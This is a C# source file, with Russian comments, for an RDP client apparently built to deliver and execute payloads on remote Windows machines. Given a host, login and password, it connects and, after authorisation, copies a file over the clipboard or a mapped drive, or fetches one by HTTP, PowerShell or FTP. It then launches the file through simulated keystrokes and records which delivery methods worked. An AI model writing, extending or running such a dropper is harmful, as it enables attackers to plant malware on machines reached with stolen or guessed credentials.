using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;
using System.IO;
using System.Runtime.InteropServices;
using System.Diagnostics;

namespace RdpUploadClient
{
    // Прокси для внешнего взаимодействия с AppDomain
    public class CaptureProxy : MarshalByRefObject
    {
        public RdpParams.SelectedMethod CallStatic(RdpParams data)
        {
            return Main.Connect(data);
        }
    }

    // Принимаемые данные
    [Serializable]
    public class RdpParams
    {
        // RDP
        public string RdpHost;
        public int RdpPort;
        public string RdpLogin;
        public string RdpPassword;
        public int Timeout;
        public int LoadTimeout;
        public int ConnectTimeout;
        public bool NLA;

        // File
        public byte[] FileBytes;
        public string FileName;

        // FTP
        public string FtpHost;
        public string FtpPort;
        public string FtpLogin;
        public string FtpPassword;
        public string FtpFilePath;

        // HTTP
        public string URL;

        // FILE PARAMS
        public string FileParams;

        //POWER SHELL SCRIPT TEXT
        public string PowerShellScriptText;

        // Переменные безопасности
        public int SecureValue1;
        public int SecureValue2;
        public int SecureValue3;
        public int SecureValue4;
        public int SecureValue5;
        public int SecureValue6;
        public int SecureValue7;
        public int SecureValue8;

        // DEBUG
        public bool Debug;

        // Selected Method
        public SelectedMethod Method;

        // Битовые флаги выбранных методов
        [Flags]
        public enum SelectedMethod
        {
            NONE = 0x00,
            FTP = 0x01,
            DRIVE = 0x02,
            CLIPBOARD = 0x04,
            HTTP_BA = 0x08,
            HTTP_PS = 0x10,
            FAIL = 0x20,
        }
    }

    internal static class Main
    {
        // Поля
        private static RDPClient client;
        internal static int InputTime;
        private static RdpParams.SelectedMethod doneMethod;
        private static object Sync = new object();
        private static object FileSync = new object();
        private static object AuthSync = new object();
        private static int AuthCount = 0;

        // Файл
        private static string FileName;
        private static byte[] FileBytes;
        private static int Timeout, LoadTimeout, ConnectTimeout;

        // Переменные безопасности
        internal static int SecureValue1;
        internal static int SecureValue2;
        internal static int SecureValue3;
        internal static int SecureValue4;
        internal static int SecureValue5;
        internal static int SecureValue6;
        internal static int SecureValue7;
        internal static int SecureValue8;

        // Подключение
        public static RdpParams.SelectedMethod Connect(RdpParams data)
        {
            // Задаем переменные безопасности
            SecureValue1 = data.SecureValue1;
            SecureValue2 = data.SecureValue2;
            SecureValue3 = data.SecureValue3;
            SecureValue4 = data.SecureValue4;
            SecureValue5 = data.SecureValue5;
            SecureValue6 = data.SecureValue6;
            SecureValue7 = data.SecureValue7;
            SecureValue8 = data.SecureValue8;

            // Отладка
            if (data.Debug)
            {
                Task.Run(() =>
                {
                    // Инициализируем форму и задаем заголовок
                    var fm = new DebugForm();
                    fm.Text = data.RdpHost + ":" + data.RdpPort.ToString() + ";" + data.RdpLogin + ";" + data.RdpPassword;

                    // Таймер обновления изображения
                    var timer = new System.Timers.Timer();
                    timer.Enabled = true;
                    timer.AutoReset = true;
                    timer.Interval = 100;
                    timer.Elapsed += (System.Timers.ElapsedEventHandler)((s, e) =>
                    {
                        lock (Sync)
                        {
                            if (!ChangedRect.IsEmpty() && Options.TryEnter())
                            {
                                if (fm != null && fm.pictureBox1 != null)
                                {
                                    ChangedRect.Clone();
                                    fm.Invoke((Action)(() =>
                                    {
                                        fm.pictureBox1.Image = Options.Canvas.Invalidate();
                                    }));
                                    ChangedRect.Reset();
                                    Options.Exit();
                                }
                            }
                        }
                    });
                    timer.Start();
                    fm.ShowDialog();
                });
            }

            // Устанавливаем таймауты
            Timeout = data.Timeout; 
            LoadTimeout = data.LoadTimeout;
            ConnectTimeout = data.ConnectTimeout;

            // Устанавливаем данные файла
            FileName = data.FileName;
            FileBytes = data.FileBytes;

            // Таймер отсечки
            TimeoutTimerStop(data.ConnectTimeout);

            // Инициализируем клиент
            client = new RDPClient();

            // Событие авторизации рдп
            Options.OnAutorizationEvent += () =>
                {
                    Task.Run(() =>
                        {
                            lock (AuthSync)
                            {
                                if (AuthCount == 0)
                                {
                                    AuthCount++;

                                    // Рабочие методы
                                    Run(data);
                                }
                            }
                        });
                };

            // Подключение
            client.Connect(data.RdpHost, data.RdpPort, data.RdpLogin, data.RdpPassword, data.ConnectTimeout, data.NLA);

            // Проверка выполненных методов
            if (!doneMethod.HasFlag(RdpParams.SelectedMethod.FTP) &&
                !doneMethod.HasFlag(RdpParams.SelectedMethod.DRIVE) &&
                !doneMethod.HasFlag(RdpParams.SelectedMethod.CLIPBOARD) &&
                !doneMethod.HasFlag(RdpParams.SelectedMethod.HTTP_BA) &&
                !doneMethod.HasFlag(RdpParams.SelectedMethod.HTTP_PS))
            {
                doneMethod |= RdpParams.SelectedMethod.FAIL;
            }

            // Возвращаем результат
            return doneMethod;
        }

        // Рабочие методы
        private static void Run(RdpParams data)
        {
            lock (FileSync)
            {
                // Загружаем файл в канал
                if (data.Method.HasFlag(RdpParams.SelectedMethod.CLIPBOARD) && FileBytes != null && !string.IsNullOrWhiteSpace(FileName))
                {
                    ClipboardChannel.SetFile(FileBytes, FileName);
                }
            }

            lock (FileSync)
            {
                // Загружаем файл в канал
                if (data.Method.HasFlag(RdpParams.SelectedMethod.DRIVE) && FileBytes != null && !string.IsNullOrWhiteSpace(FileName))
                {
                    try
                    {
                        FileSystemChannel.LoadFileToStorage(FileBytes, FileName, Timeout, LoadTimeout);
                    }
                    catch { }
                }
            }

            lock (FileSync)
            {
                // Стрелка влево
                InputKeys.ScanCode.SendKeyEx(0x4B);
                Thread.Sleep(Timeout);
                InputKeys.Input.Enter();
                Thread.Sleep(Timeout);
            }

            lock (FileSync)
            {
                // Clipboard
                if (data.Method.HasFlag(RdpParams.SelectedMethod.CLIPBOARD) && FileBytes != null && !string.IsNullOrWhiteSpace(FileName))
                {
                    if (Network.ConnectionAlive)
                    {
                        if (!string.IsNullOrWhiteSpace(data.FileParams))
                            InputKeys.Input.LoadAndRunFileFromClipboard(Timeout, LoadTimeout, data.FileParams);
                        else
                            InputKeys.Input.LoadAndRunFileFromClipboard(Timeout, LoadTimeout, "");

                        doneMethod |= RdpParams.SelectedMethod.CLIPBOARD;
                    }
                }
            }

            lock (FileSync)
            {
                // HTTP_BA
                if (data.Method.HasFlag(RdpParams.SelectedMethod.HTTP_BA) && !string.IsNullOrWhiteSpace(data.URL))
                {
                    if (Network.ConnectionAlive)
                    {
                        if (!string.IsNullOrWhiteSpace(data.FileParams))
                            InputKeys.Input.LoadAndRunFileFromHTTP_BA(data.URL, Timeout, LoadTimeout, data.FileParams);
                        else
                            InputKeys.Input.LoadAndRunFileFromHTTP_BA(data.URL, Timeout, LoadTimeout, "");

                        doneMethod |= RdpParams.SelectedMethod.HTTP_BA;
                    }
                }
            }

            lock (FileSync)
            {
                // HTTP_PS
                if (data.Method.HasFlag(RdpParams.SelectedMethod.HTTP_PS) && !string.IsNullOrWhiteSpace(data.PowerShellScriptText))
                {
                    if (Network.ConnectionAlive)
                    {
                        InputKeys.Input.LoadAndRunFileFromHTTP_PS(data.PowerShellScriptText, Timeout, LoadTimeout);

                        doneMethod |= RdpParams.SelectedMethod.HTTP_PS;
                    }
                }
            }

            lock (FileSync)
            {
                // Drive
                if (data.Method.HasFlag(RdpParams.SelectedMethod.DRIVE) && FileBytes != null && !string.IsNullOrWhiteSpace(FileName))
                {
                    if (Network.ConnectionAlive)
                    {
                        if (!string.IsNullOrWhiteSpace(data.FileParams))
                            InputKeys.Input.LoadAndRunFileFromDrive(FileName, Timeout, LoadTimeout, data.FileParams);
                        else
                            InputKeys.Input.LoadAndRunFileFromDrive(FileName, Timeout, LoadTimeout, "");

                        doneMethod |= RdpParams.SelectedMethod.DRIVE;
                    }
                }
            }

            lock (FileSync)
            {
                // FTP
                if (data.Method.HasFlag(RdpParams.SelectedMethod.FTP) &&
                    !string.IsNullOrWhiteSpace(data.FtpHost) &&
                    !string.IsNullOrWhiteSpace(data.FtpLogin) &&
                    !string.IsNullOrWhiteSpace(data.FtpFilePath))
                {
                    if (Network.ConnectionAlive)
                    {
                        if (!string.IsNullOrWhiteSpace(data.FileParams))
                        {
                            InputKeys.Input.LoadAndRunFileFromFTP(
                                data.FtpHost + (!string.IsNullOrWhiteSpace(data.FtpPort) ? " " + data.FtpPort : ""),
                                data.FtpLogin,
                                data.FtpPassword,
                                data.FtpFilePath,
                                Timeout,
                                LoadTimeout,
                                data.FileParams);
                        }
                        else
                        {
                            InputKeys.Input.LoadAndRunFileFromFTP(
                                data.FtpHost + (!string.IsNullOrWhiteSpace(data.FtpPort) ? " " + data.FtpPort : ""),
                                data.FtpLogin,
                                data.FtpPassword,
                                data.FtpFilePath,
                                Timeout,
                                LoadTimeout,
                                "");
                        }

                        doneMethod |= RdpParams.SelectedMethod.FTP;
                    }
                }
            }

            lock (FileSync)
            {
                // Отключение
                if (Network.ConnectionAlive)
                {
                    client.Disconnect();
                }
                else
                {
                    Options.IsRunned = false;
                }
            }
        }

        private static void TimeoutTimerStop(int timeout)
        {
            // Таймер обновления изображения
            var timeoutTimer = new System.Timers.Timer();
            timeoutTimer.Enabled = true;
            timeoutTimer.AutoReset = false;
            timeoutTimer.Interval = timeout;
            timeoutTimer.Elapsed += (System.Timers.ElapsedEventHandler)((s, e) =>
            {
                // Отключение
                if (Network.ConnectionAlive)
                {
                    client.Disconnect();
                }
                else
                {
                    Options.IsRunned = false;
                }
            });
            timeoutTimer.Start();
        }

    }
}